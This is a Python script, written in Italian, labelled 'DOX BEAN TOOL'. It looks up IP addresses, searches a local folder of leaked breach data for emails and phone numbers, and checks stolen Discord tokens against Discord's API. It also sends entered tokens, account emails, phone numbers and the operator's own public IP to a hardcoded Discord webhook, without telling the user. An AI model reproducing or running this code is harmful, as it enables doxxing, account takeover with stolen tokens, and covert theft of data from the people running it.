import os
import time
import requests
from colorama import init, Fore
from plyer import notification

init(autoreset=True)

WEBHOOK_URL = "https://discord.com/api/webhooks/1401542597406752849/lzEe8c-NWRgjd1_girw-vennMf3sjGH3DZsDGaNd8-Gdjz5DC9ZGRV_-32eiauOKbA3l"

MADE_BY = "Made By ❆⋆MINI LARP⋆❆"
ASCII_ART = r'''
/$$$$$$$                            /$$$$$$$                                      /$$$$$$$$                  /$$      
| $$__  $$                          | $$__  $$                                    |__  $$__/                 | $$      
| $$  \ $$  /$$$$$$  /$$   /$$      | $$  \ $$  /$$$$$$   /$$$$$$  /$$$$$$$          | $$  /$$$$$$   /$$$$$$ | $$      
| $$  | $$ /$$__  $$|  $$ /$$/      | $$$$$$$  /$$__  $$ |____  $$| $$__  $$         | $$ /$$__  $$ /$$__  $$| $$      
| $$  | $$| $$  \ $$ \  $$$$/       | $$__  $$| $$$$$$$$  /$$$$$$$| $$  \ $$         | $$| $$  \ $$| $$  \ $$| $$      
| $$  | $$| $$  | $$  >$$  $$       | $$  \ $$| $$_____/ /$$__  $$| $$  | $$         | $$| $$  | $$| $$  | $$| $$      
| $$$$$$$/|  $$$$$$/ /$$/\  $$      | $$$$$$$/|  $$$$$$$|  $$$$$$$| $$  | $$         | $$|  $$$$$$/|  $$$$$$/| $$      
|_______/  \______/ |__/  \__/      |_______/  \_______/ \_______/|__/  |__/         |__/ \______/  \______/ |__/      
'''

def send_to_webhook(label: str, message: str):
    try:
        if any(x in label.lower() for x in ["ip", "email", "telefono", "token"]):
            data = {"content": f"📌 **{label}**\n{message}"}
            r = requests.post(WEBHOOK_URL, json=data, timeout=10)
            if r.status_code not in (200, 204):
                print(f"{Fore.RED}❌ Webhook errore: {r.status_code}")
    except Exception as e:
        print(f"{Fore.RED}❌ Errore webhook: {e}")

def loading_bar():
    bar_width = 50
    print("\n")
    print(Fore.RED + MADE_BY.center(100))
    for i in range(101):
        filled = int(bar_width * i // 100)
        bar = "█" * filled + "-" * (bar_width - filled)
        line = f" Loading: [{bar}] {i}% "
        print("\r" + Fore.RED + line.center(100), end="")
        time.sleep(0.01)
    print("\n")

def show_notification(title, message):
    try:
        notification.notify(title=title, message=message, app_name="IPv4 Tool", timeout=5)
    except:
        print(f"{Fore.YELLOW}⚠️ Notifiche non supportate.")

def save_breach_result(term, file_name, matched_lines):
    os.makedirs("braech result", exist_ok=True)
    file_path = os.path.join("braech result", f"{term}_result.txt")
    with open(file_path, "a", encoding="utf-8") as f:
        f.write(f"File: {file_name}\n")
        for line in matched_lines:
            f.write(f"- {line}\n")
        f.write("\n")

def discord_token_info(token, found_in_file=None):
    headers = {"Authorization": token}
    try:
        r = requests.get("https://discord.com/api/v10/users/@me", headers=headers, timeout=10)
        if r.status_code != 200:
            print(Fore.RED + "❌ Token Discord non valido o scaduto.")
            send_to_webhook("Token Discord non valido", f"Token: {token}")
            return

        d = r.json()
        username = f"{d['username']}#{d['discriminator']}"
        email = d.get('email')
        phone = d.get('phone')
        try:
            ip = requests.get("https://api.ipify.org", timeout=5).text
        except:
            ip = None

        info_lines = [f"👤 Username: {username}"]
        if email: info_lines.append(f"📧 Email: {email}")
        if phone: info_lines.append(f"📾 Telefono: {phone}")
        info_lines.append(f"🔑 Token: {token}")
        if ip: info_lines.append(f"🌐 IP stimato: {ip}")

        info = "\n".join(info_lines)
        print(Fore.GREEN + info)
        send_to_webhook("Token Discord", info)

        with open("discord_account_info.txt", "w", encoding="utf-8") as f:
            f.write(info)

    except Exception as e:
        print(Fore.RED + f"❌ Errore nel recupero info token: {e}")

def ip_lookup(ip):
    try:
        r = requests.get(f"https://ipinfo.io/{ip}/json", timeout=10).json()
        info = (
            f"🔍 IP Lookup\n"
            f"IP: {ip}\n"
            f"Host: {r.get('hostname', 'N/A')}\n"
            f"Città: {r.get('city', 'N/A')}\n"
            f"Regione: {r.get('region', 'N/A')}\n"
            f"Paese: {r.get('country', 'N/A')}\n"
            f"Org: {r.get('org', 'N/A')}"
        )
        print(info)
        send_to_webhook("IP Lookup", info)
    except Exception as e:
        print(f"Errore IP: {e}")

def phone_lookup(number):
    print(Fore.RED + f"Simulazione ricerca telefono per: {number}")
    results = search_data_breach(number)
    if results:
        print("\n\n📂 Trovato nei seguenti file:")
        for file, lines in results.items():
            print(f"- {file} ({len(lines)} occorrenze)")
        send_to_webhook("Telefono trovato", number)
    else:
        print("❌ Nessun risultato trovato.")

def email_lookup(email):
    dominio = email.split("@")[-1].lower() if "@" in email else "sconosciuto"
    provider = {
        "gmail.com": "Google", "outlook.com": "Outlook",
        "yahoo.com": "Yahoo", "hotmail.com": "Hotmail"
    }.get(dominio, "Sconosciuto")
    print(Fore.RED + f"Email: {email}\nProvider: {provider}")
    results = search_data_breach(email)
    if results:
        print("\n📂 Trovato nei seguenti file:")
        for file, lines in results.items():
            print(f"- {file} ({len(lines)} occorrenze)")
        send_to_webhook("Email trovata", email)
    else:
        print("❌ Nessun risultato trovato.")

def find_data_breach_folder():
    for root, dirs, _ in os.walk("C:\\"):
        for d in dirs:
            if d.lower() == "data breach":
                return os.path.join(root, d)
    return None

def search_data_breach(term):
    folder = find_data_breach_folder()
    if not folder:
        print(Fore.RED + "❌ Cartella 'data breach' non trovata nel PC.")
        return {}

    results = {}

    for root, _, files in os.walk(folder):
        for f in files:
            if f.endswith(".txt") or f.endswith(".csv"):
                path = os.path.join(root, f)
                try:
                    with open(path, "r", encoding="utf-8", errors="ignore") as file:
                        for line in file:
                            if term in line:
                                matched_line = line.strip()
                                results.setdefault(f, []).append(matched_line)
                                print(Fore.GREEN + f"\n✅ Trovato in {f}. Inviato al webhook.")
                                save_breach_result(term, f, [matched_line])
                                if len(term) > 50 and "." in term:
                                    discord_token_info(term, found_in_file=f)
                except:
                    continue

    return results

def breach_search():
    term = input(Fore.RED + "Inserisci email, numero, ID o username da cercare: ").strip()
    if not term:
        print("Input non valido.")
        return
    results = search_data_breach(term)
    if results:
        print("\n📁 Risultati trovati:")
        for file, lines in results.items():
            print(f"- {file} ({len(lines)} occorrenze)")
    else:
        print("❌ Nessun risultato nei data breach.")

def first_page():
    print(Fore.RED + ASCII_ART)
    print(Fore.RED + MADE_BY.center(100))
    while True:
        print(Fore.RED + "========= DOX BEAN TOOL =========")
        print("1. IP Lookup")
        print("2. Phone Lookup")
        print("3. Email Lookup")
        print("4. Discord Token Info")
        print("5. Ricerca nei Data Breach")
        print("6. Esci")
        scelta = input(Fore.RED + ">> ").strip()
        match scelta:
            case "1": ip_lookup(input("IP: "))
            case "2": phone_lookup(input("Numero (+...): "))
            case "3": email_lookup(input("Email: "))
            case "4": discord_token_info(input("Token: "))
            case "5": breach_search()
            case "6": break
            case _: print("Scelta non valida.")

def menu():
    loading_bar()
    while True:
        first_page()
        input("\nPremi INVIO per tornare al menu...")

if __name__ == "__main__":
    menu()
